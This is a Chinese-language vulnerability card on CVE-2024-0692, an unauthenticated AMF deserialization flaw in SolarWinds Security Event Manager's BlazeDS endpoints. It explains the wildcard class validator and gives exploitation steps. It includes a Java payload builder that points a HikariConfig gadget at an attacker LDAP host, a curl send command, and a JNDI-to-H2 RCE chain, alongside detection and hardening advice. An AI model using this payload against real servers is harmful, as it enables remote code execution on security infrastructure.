---
id: web-java-component-solarwinds-sem-blazeds-amf-deserialization-wildcard-validator
title: SolarWinds SEM BlazeDS AMF 反序列化入口：/messagebroker/streamingamf 未授权 POST 与 services-config 通配白名单绕过
type: scenario
domain: web
path: web/java/deserialization
technique: solarwinds-sem-blazeds-amf-deserialization-wildcard-validator
aliases:
- CVE-2024-0692
- SolarWinds Security Event Manager
- BlazeDS AMF
- StreamingAMFEndpoint
- SerializationFilter
- ClassDeserializationValidator
- messagebroker streamingamf
tags:
- java
- solarwinds
- blazeds
- amf
- deserialization
- cve-2024-0692
- rce
cve:
- CVE-2024-0692
severity: critical
confidence: high
status: verified
created: '2026-11-11'
updated: '2026-11-11'
verification:
  verified_by: verifier-V503
  verified_at: '2026-11-11T03:25:35+08:00'
  notes: 已对照原文与19/19图核对：services-config.xml 的 SecureAMFEndpoint/ManagedSecureStreamingAmfEndpoint 路径、allow-xml=true 与 validator allow-classes .*（.*通配使默认白名单失效）、SerializationFilter→SerializationContext.newMessageDeserializer→req.getInputStream→deserialize.readMessage、无鉴权 POST application/amf 返回 AMF ErrorMessage（图7-9）均与原文一致；CVE-2024-0692 记录无误。原文未给出 SEM 受影响版本区间（仅 BlazeDS 4.7.3/Java 17），故 affected_versions 不填，符合规则。未在未授权目标验证。
---

## 一句话结论

SolarWinds Security Event Manager 的 Flex/BlazeDS 消息端点 `/services/messagebroker/amf` 与 `/services/messagebroker/streamingamf` 在请求进入 `SerializationFilter` 时会把 POST body 交给 AMF `MessageDeserializer` 反序列化，且没有鉴权；产品自带的 `services-config.xml` 把 `ClassDeserializationValidator` 的 `allow-classes` 配成通配 `.*`（手动白名单会关闭 BlazeDS 默认白名单），于是攻击者只要 `Content-Type: application/amf` 发送任意 AMF `ActionMessage`，就能实例化任意 classpath 类并经 setter 注入，配合 HikariCP/H2 gadget 达成 RCE（CVE-2024-0692）。

## 原理

- **入口组件**：SolarWinds SEM 使用 Apache Flex BlazeDS 4.7.3（`flex-messaging-*.jar`）。`StreamingAMFEndpoint`/`SecureAMFEndpoint` 的 `createFilterChain()` 创建责任链，第一个是 `flex.messaging.endpoints.amf.SerializationFilter`。
- **反序列化点**：`SerializationFilter.invoke()` 中 `SerializationContext.getSerializationContext()` → `sc.newMessageDeserializer()` → 取 `HttpServletRequest.getInputStream()` → `deserializer.initialize(sc, in, debugTrace)` → `deserializer.readMessage(m, context)`。整个流程不检查登录态/角色，POST 数据即触发。
- **端点与协议**：`services-config.xml` 中定义 `https://{server.name}:8443/services/messagebroker/amf`（`flex.messaging.endpoints.SecureAMFEndpoint`）和 `https://{server.name}:8443/services/messagebroker/streamingamf`（`com.solarwinds.lem.flex.blazeds.ManagedSecureStreamingAmfEndpoint`）；8080 的两个非安全端点配置存在但不可访问。请求头 `Content-Type: application/amf`，body 为 AMF 二进制。
- **AMF 反序列化语义**：AMF 是基于 setter/getter 的二进制序列化协议，反序列化时调用目标类的公共无参构造方法，再按属性调用 setter 恢复字段；入口不是 `readObject`，因此不要求类实现 `Serializable`（文章实测非 Serializable 类也可被序列化/反序列化），commons-collections 这类依赖 `readObject` 的链不适用，但任意 setter 可被触发（如 HikariConfig.setMetricRegistry 的 JNDI lookup）。
- **白名单被通配符绕过**：BlazeDS 4.7.3 默认启用 `ClassDeserializationValidator` 并内置安全白名单；但只要在配置里手写 `<allow-classes>`，默认白名单就被替换。SEM 的 `contego/run/tomcat/webapps/ROOT/WEB-INF/flex/services-config.xml` 写的是 `<class name=".*"/>`，等价于允许所有类，validator 形同虚设。
- **为什么能 RCE**：AMF 反序列化先触发 setter/gadget（如 HikariConfig 的 JNDI），再结合目标 classpath 中的 HikariCP/H2 等库转成 JDBC 攻击，最终通过 H2 `CREATE ALIAS`/System.load 或 Spring XML 执行命令（详见关联卡）。Java 17 环境下 TemplatesImpl/JdbcRowSetImpl/旧 commons-collections 链不可用，JDBC/H2 是主要路径。
- **可达性验证**：Burp 向 `/services/messagebroker/streamingamf` POST 任意内容（Content-Type application/amf）返回 200 与 AMF `ErrorMessage`（`Unsupported AMF version ...`），证明端点未鉴权且已进入 AMF 解析。
- **边界**：需要 8443 端点可达；修复版本/关闭 AMF 端点或收紧 validator 白名单后失效；AMF body 需正确构造（`ActionMessage`/`MessageBody` 等）。

## 触发条件

- 目标运行受影响的 SolarWinds Security Event Manager，8443 端口的 `/services/messagebroker/amf` 或 `/streamingamf` 可从攻击者网络访问。
- `services-config.xml` 的 `ClassDeserializationValidator` 使用通配 `.*`（或等价地允许了危险类）。
- 目标 classpath 存在可用的 setter gadget/JDBC 链（如 HikariCP、H2、Spring 等，产品自带依赖中即有）。
- 仅限授权测试与防御验证。

## 利用步骤

1. 确认 `https://target:8443/services/messagebroker/streamingamf` 可达：POST 任意 body、`Content-Type: application/amf`，观察 AMF ErrorMessage 响应。
2. 构造 AMF `ActionMessage`/`MessageBody`，body 中放入目标 gadget 对象（如 `HikariConfig`，把 `metricRegistry` 设为 `ldap://attacker/x`）。
3. 用 BlazeDS 的 `AmfMessageSerializer` 在本地生成二进制 payload（见 PoC）。
4. `curl --data-binary @payload.amf` 发送到 `/services/messagebroker/streamingamf`（或 `/amf`）。
5. 在攻击者侧起 LDAP/RMI 服务，接收 JNDI 请求；通过 HikariJNDIFactory 把 JNDI 转成 H2 JDBC URL，再用 H2 `CREATE ALIAS` 或 Spring XML 完成 RCE。
6. 也可以直接用其它允许的 setter gadget 触发 JNDI/JDBC（见关联卡）。

## PoC

AMF 序列化骨架（文章代码整理）：

```java
HikariConfig config = new HikariConfig();
Field f = HikariConfig.class.getDeclaredField("metricRegistry");
f.setAccessible(true);
f.set(config, "ldap://attacker:1389/x");

MessageBody body = new MessageBody();
body.setData(config);
ActionMessage message = new ActionMessage();
message.addBody(body);
ByteArrayOutputStream out = new ByteArrayOutputStream();
AmfMessageSerializer serializer = new AmfMessageSerializer();
serializer.initialize(SerializationContext.getSerializationContext(), out, null);
serializer.writeMessage(message);
Files.write(Paths.get("payload.amf"), out.toByteArray());
```

发送：

```bash
curl -k https://target:8443/services/messagebroker/streamingamf \
  -H "Content-Type: application/amf" --data-binary @payload.amf --output -
```

说明：本地生成 payload 时需把 `ClassDeserializationValidator` 设为允许 `.*`（`validator.addAllowClassPattern(".*")`），以模拟目标配置；未在未授权目标执行。

## 变体与关联

- **HikariCP JNDI/HikariJNDIFactory**：setter 触发 JNDI 与 JNDI→JDBC 的具体 payload 见 [[web-java-deserialization-jndi-hikaricp-metricregistry-hikarijndifactory]]（同批 HikariCP 卡）。
- **JNDI→JDBC 同类工厂**：ViburDBCPObjectFactory 见 [[web-java-deserialization-jndi-viburdbcp-objectfactory-jdbc]]；c3p0/druid 等本地 ObjectFactory 见 `web/java/deserialization/jndi` 下相关卡。
- **H2 受限环境 RCE**：见 [[web-java-component-h2-jre-only-create-alias-static-method-rce]] 与 [[web-java-component-h2-create-alias-file-write-system-load]]。
- **AMF 背景**：AMF 反序列化基础与历史案例可参考 `web/java/deserialization` 下其他协议卡；BlazeDS 4.7.3 默认禁用 XML 反序列化并启用 validator，本产品因 `allow-classes .*` 失效。
- **边界**：端点关闭/鉴权、validator 收紧、无可用 gadget 时链不成立；AMF 版本/结构错误会返回 ErrorMessage。

## 检测与防御

- **流量**：`Content-Type: application/amf` 的 POST 到 `/services/messagebroker/amf`、`/streamingamf`；body 中出现 `HikariConfig`、`metricRegistry`、`ldap://`/`rmi://`、`java.lang.Runtime`、`CREATE ALIAS` 等字符串（AMF 字符串可见）；来自非业务客户端的 8443 请求。
- **配置审计**：检查 `services-config.xml` 是否有 `<class name=".*"/>`；validator 应显式列出必要类，禁用 AMF 端点或加认证。
- **主机/网络**：Tomcat/Java 进程向外部 LDAP/RMI/JDBC 发起连接；H2 驱动加载、`CREATE ALIAS`/`INIT` SQL、临时 .so 写入与 `System.load`；Java 17 下异常栈含 `SerializationFilter`/`AmfMessageDeserializer`。
- **防御**：升级到修复版本/应用补丁；不使用 BlazeDS AMF 或将其限制在可信网络并加认证；严格 validator 白名单；出站限制 LDAP/RMI/JDBC；移除不必要的 H2/HikariCP 依赖；启用 WAF 对 `application/amf` 的检测仅作补充。
